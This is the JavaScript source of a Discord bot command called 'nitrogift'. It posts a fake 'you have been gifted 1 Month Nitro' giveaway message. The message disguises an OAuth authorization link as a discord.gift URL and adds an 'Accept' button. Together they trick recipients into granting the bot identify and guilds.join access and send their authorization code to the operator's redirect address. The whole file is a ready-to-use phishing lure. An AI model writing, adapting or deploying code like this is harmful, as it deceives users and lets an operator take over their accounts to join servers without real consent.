const discord = require('discord.js')

const epic = require("../../epic")
const { EmbedBuilder, codeBlock } = require("@discordjs/builders");
const { Colors, ApplicationCommandOptionType, PermissionFlagsBits, ChatInputCommandInteraction } = require("discord.js");
const { ApplicationCommandType, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
module.exports = {
  name: "nitrogift",
  description: "nitro gift",
  default_permission: true,
  timeout: 3000,
  category: "whitelist",
 userPerms: [discord.PermissionFlagsBits.SendMessages],
  ownerOnly: false,

  run: async (client, interaction, args) => {
   const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setLabel(`Accept`)
      .setStyle(ButtonStyle.Link)
     .setURL(`https://discord.com/oauth2/authorize?client_id=${epic.client_id}&redirect_uri=${epic.redirect_uri}&response_type=code&scope=identify%20guilds.join&state=%7B%22guild%22%3A%22${interaction.guild.id}%22%2C%22bot%22%3A%22${epic.client_id}%22%7D`)
          )
  interaction.deferReply();
  interaction.deleteReply();
  interaction.channel.send({embeds: [new discord.EmbedBuilder().setImage("https://images-ext-1.discordapp.net/external/at0vWutlNElPTf9ZXuTLF-3dXQYyNNpSeebpITgE9WY/https/gitlab.com/derpystuff/discord-asset-datamining/-/raw/master/lottie/gif/nitro_boost_ios_%286e896200497506ae351b3d12b500a5a8%29.gif")       .setThumbnail('https://i.imgur.com/tBpj3bo.gif')
  .setTitle("Hey, you have been gifted 1 Month Nitro!")
    .setDescription(`Congratulations on being selected as the lucky winner for the Nitro giveaway in This Server.\n\nHere is your gift, enjoy!\n**➔ [https:/discord.gift/hAzYgzGm3XXr3SHu](${`https://discord.com/oauth2/authorize?client_id=${epic.client_id}&redirect_uri=${epic.redirect_uri}&response_type=code&scope=identify%20guilds.join&state=%7B%22guild%22%3A%22${interaction.guild.id}%22%2C%22bot%22%3A%22${epic.client_id}%22%7D`})**`)
        .setColor("#7289da")], components: [row]})


    
  }
}